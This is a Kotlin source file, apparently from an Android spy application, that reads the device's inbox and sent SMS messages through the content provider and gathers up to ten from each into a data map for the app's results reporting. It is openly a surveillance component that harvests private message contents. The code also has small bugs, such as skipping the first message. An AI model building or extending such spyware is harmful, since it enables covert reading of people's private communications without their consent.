package com.komnacki.androidspyapp.sms

import android.content.ContentResolver
import android.content.Context
import android.net.Uri
import com.komnacki.androidspyapp.results.Message

class SmsState(override var context: Context) :
    Message {

    init {
        getSms(context)
    }

    companion object {

        const val SMS_COUNT_LIMIT = 10

        private val info: MutableMap<String, Any> = mutableMapOf()
        private lateinit var contentResolver: ContentResolver

        fun getSms(context: Context) {
            contentResolver = context.contentResolver

            val inboxSmses: MutableList<MessagePOJO> = getMessages(MessageType.INBOX) as MutableList<MessagePOJO>
            val sentSmses: MutableList<MessagePOJO> = getMessages(MessageType.SENT) as MutableList<MessagePOJO>

            inboxSmses.addAll(sentSmses)

            inboxSmses.forEach { m ->
                info.put(m.date!!, m)
            }
        }

        private fun getMessages(messageType: MessageType) : List<MessagePOJO> {
            var counter = 0
            val list = ArrayList<MessagePOJO>()
            val cursorInbox =
                when(messageType) {
                    MessageType.INBOX -> contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
                    MessageType.SENT -> contentResolver.query(Uri.parse("content://sms/sent"), null, null, null, null)
                }
            if (cursorInbox !!.moveToFirst()) { // must check the result to prevent exception
                while (cursorInbox.moveToNext()) {
                    if (counter < SMS_COUNT_LIMIT) {
                        counter ++
                        list.add(
                            MessagePOJO(
                                if (cursorInbox.isNull(0)) - 1 else cursorInbox.getLong(0),
                                if (cursorInbox.isNull(1)) - 1 else cursorInbox.getLong(1),
                                if (cursorInbox.isNull(2)) "Brak danych" else cursorInbox.getString(2),
                                if (cursorInbox.isNull(3)) "Brak danych" else cursorInbox.getString(3),
                                if (cursorInbox.isNull(4)) - 1 else cursorInbox.getLong(4)
//                                if (cursorInbox.isNull(5)) - 1 else cursorInbox.getLong(5),
//                                if (cursorInbox.isNull(6)) - 1 else cursorInbox.getLong(6),
//                                if (cursorInbox.isNull(7)) "Brak danych" else cursorInbox.getString(7),
//                                if (cursorInbox.isNull(8)) "Brak danych" else cursorInbox.getString(8),
//                                if (cursorInbox.isNull(9)) "Brak danych" else cursorInbox.getString(9),
//                                if (cursorInbox.isNull(11)) "Brak danych" else cursorInbox.getString(11),
//                                if (cursorInbox.isNull(12)) "Brak danych" else cursorInbox.getString(12)
//                            -1,
//                            -1,
//                            "null",
//                            "null",
//                            "null",
//                            "null",
//                            "null"
                            )
                        )

                        var msgData = ""

                        for (idx in 0 until cursorInbox.columnCount) {
                            msgData += " " + cursorInbox.getColumnName(idx) + ":" + cursorInbox.getString(idx)
                        }
                    } else {
                        break
                    }
                }
            } else { /* no action*/ }
            cursorInbox.close()
            return list
        }

    }

    override fun getData(): Map<String, Any> {
        return info
    }
}

enum class MessageType {
    INBOX, SENT
}
